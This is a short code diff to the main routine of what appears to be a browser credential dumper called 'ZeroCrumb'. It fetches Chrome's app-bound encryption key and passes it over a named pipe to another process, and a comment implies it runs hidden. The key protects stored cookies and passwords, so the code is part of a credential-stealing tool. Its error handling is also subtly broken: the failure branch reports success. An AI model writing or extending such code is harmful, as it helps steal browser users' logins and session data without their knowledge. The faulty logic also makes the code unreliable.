@@ -12,25 +12,23 @@ int main()
     PBYTE key = dumper::getAppBoundKey(dumper::configs::chrome, path);
 
     // only shows if process isn't hidden / directly running the dumper
-    if (!key)
+    if (!key) {
         printf("[DEBUG] Failed To Fetch Key.\n");
-    else
-        printf("[DEBUG] Decrypted Key Address: 0x%p\n", key);
+        return -1;
+    }
+    else {
+        printf("[DEBUG] Successfully Fetched Key.\n");
+    }
 
-    if (key) {
+    auto pipe = comm::createPipe();
 
-        auto pipe = comm::createPipe();
+    comm::waitUntilConnected(pipe);
 
-        comm::waitUntilConnected(pipe);
-
-        if (comm::writeAppBoundKey(pipe, key)) {
-            MessageBoxW(
-                NULL,
-                L"Wrote Key To Named Pipe!",
-                L"ZeroCrumb",
-                MB_ICONEXCLAMATION
-            );
-        }
+    if (comm::writeAppBoundKey(pipe, key)) {
+        printf("[DEBUG] Successfully Wrote Key.\n");
+    }
+    else {
+        printf("[DEBUG] Successfully Wrote Key.\n");
     }
 
     return 0;
